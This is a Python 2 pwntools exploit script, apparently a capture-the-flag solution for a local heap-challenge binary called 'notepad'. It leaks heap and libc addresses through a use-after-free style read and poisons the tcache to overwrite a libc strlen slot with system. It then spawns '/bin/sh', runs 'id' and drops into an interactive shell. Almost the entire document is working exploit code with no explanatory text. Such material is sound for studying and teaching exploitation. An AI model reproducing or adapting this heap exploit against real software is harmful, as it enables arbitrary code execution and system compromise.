#!/usr/bin/env python2
from pwn import *
context.terminal = ["tmux", "split", "-h"]
p = process("./notepad")
e = ELF("./notepad")
libc = e.libc

def alloc(idx, msg, length=None):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(idx))
    if length == 0:
        p.sendlineafter(": ", str(length))
        p.recvuntil(": ")
    else:
        p.sendlineafter(": ", str(len(msg)))
        p.sendlineafter(": ", msg)

def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    
def printer():
    p.sendlineafter("> ", "3")

alloc(0, "Q")
delete(0)
alloc(0, "", 0)
printer()
p.recvuntil("0 -> ")
heap = u64(p.recvline()[:-1] + "\x00\x00\x00") << 12
print "heap", hex(heap)

for i in range(1, 9):
    alloc(i, "Q")

for i in range(2, 9):
    delete(i)

delete(1)
alloc(1, "", 0)
printer()
p.recvuntil("1 -> ")
libc_base = u64(p.recvline()[:-1] + "\x00\x00") - 0x219ce0
print "libc_base",  hex(libc_base)

system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search("/bin/sh\x00").next()
j_strlen = libc_base + 0x219098

print "system", hex(system)
print "jstrlen", hex(j_strlen)
alloc(8, p64((heap>>12) ^ (j_strlen-8)))
alloc(9, "X", 1)

alloc(10, p64(0xdeadbeefcafecafe) + p64(system) + " ")
# gdb.attach(p)
alloc(0, "/bin/sh\n")

printer() # shell

p.sendline("id")
p.interactive()
